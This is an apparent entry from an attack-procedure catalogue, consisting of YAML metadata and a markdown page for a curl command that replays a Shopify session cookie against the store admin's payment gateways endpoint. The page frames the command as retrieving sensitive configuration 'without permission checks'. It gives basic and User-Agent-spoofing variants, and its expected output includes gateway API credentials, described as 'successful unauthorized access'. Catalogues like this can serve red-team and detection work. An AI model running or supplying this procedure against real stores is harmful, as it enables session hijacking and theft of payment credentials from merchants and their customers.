---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl -H "Cookie: _shopify_s=your_session_cookie"
  https://shop.myshopify.com/admin/payment_gateways.json
tags:
  - api
  - curl
  - shopify
type: command
output: 'null'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T12:00:00Z'
updated_at: '2025-12-14T17:28:51.825Z'
verified: false
validated: true
submitted: true
---
# curl-access-payment-gateways

## Command

```bash
curl -H "Cookie: _shopify_s=your_session_cookie" https://shop.myshopify.com/admin/payment_gateways.json
```

## Description

This command uses curl to send an authenticated GET request to Shopify's payment gateways API endpoint, retrieving sensitive configuration data without permission checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | Session cookie header for authentication | Yes |
| `https://shop.myshopify.com/...` | Target API URL (replace with store domain) | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: _shopify_s=abc123" https://example.myshopify.com/admin/payment_gateways.json
```

### Advanced Usage

```bash
curl -H "Cookie: _shopify_s=abc123" -H "User-Agent: Mozilla/5.0" https://example.myshopify.com/admin/payment_gateways.json | jq .
```

## Expected Output

JSON array of payment gateways, e.g., `[{ "name": "Stripe", "status": "active", "credentials": { "api_key": "pk_..." } }]` indicating successful unauthorized access.

## Related

- [[Related Procedure: Access-Payment-Gateways-API-Endpoint]]
